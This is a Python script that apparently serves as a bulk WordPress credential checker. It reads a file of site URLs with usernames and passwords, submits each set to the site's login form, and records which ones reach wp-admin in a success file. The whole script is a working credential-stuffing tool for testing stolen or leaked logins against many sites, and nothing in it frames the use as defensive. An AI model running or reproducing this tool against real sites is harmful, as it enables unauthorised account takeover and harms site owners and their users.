import requests
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

def check_wordpress_login(url, username, password):
    login_data = {
        'log': username,   # 'log' is the name of the username field in WordPress
        'pwd': password,   # 'pwd' is the name of the password field in WordPress
        'wp-submit': 'Log In',
        'redirect_to': url,
        'testcookie': '1'
    }

    # Start a session to manage cookies
    with requests.Session() as session:
        try:
            # Get the login page to fetch any necessary cookies
            response = session.get(url, timeout=10)

            if response.status_code == 200:
                # Attempt login
                login_response = session.post(url, data=login_data, timeout=10)

                # Check if login was successful by inspecting the response
                if "wp-admin" in login_response.url:
                    return True  # Login successful
                else:
                    return False  # Login failed
            else:
                return False  # Could not reach the site

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Error connecting to {url}: {e}")
            return False

def main():
    success_logins = []
    checks = input("Enter Your List Slash File : ")
    with open(checks, 'r') as file:
        # Read each line in the file
        for line in file:
            try:
                # Split the line into URL, username, and password
                url, username, password = line.strip().split('|')
            except ValueError:
                print(f"{Fore.YELLOW}Invalid line format: {line.strip()}")
                continue

            # Attempt to log in
            success = check_wordpress_login(url, username, password)

            # Output the result with colored text
            if success:
                print(f"{Fore.GREEN}Login successful for {url} with username {username}")
                # Save successful login attempt
                success_logins.append(f"{url}|{username}|{password}")
            else:
                print(f"{Fore.RED}Login failed for {url} with username {username}")

    # Save all successful logins to success.txt
    if success_logins:
        with open('wordpress_slash_success.txt', 'w') as success_file:
            for login in success_logins:
                success_file.write(login + '\n')
        print(f"{Fore.CYAN}\nAll successful logins have been saved to success.txt")
    else:
        print(f"{Fore.YELLOW}\nNo successful logins to save.")

if __name__ == "__main__":
    main()
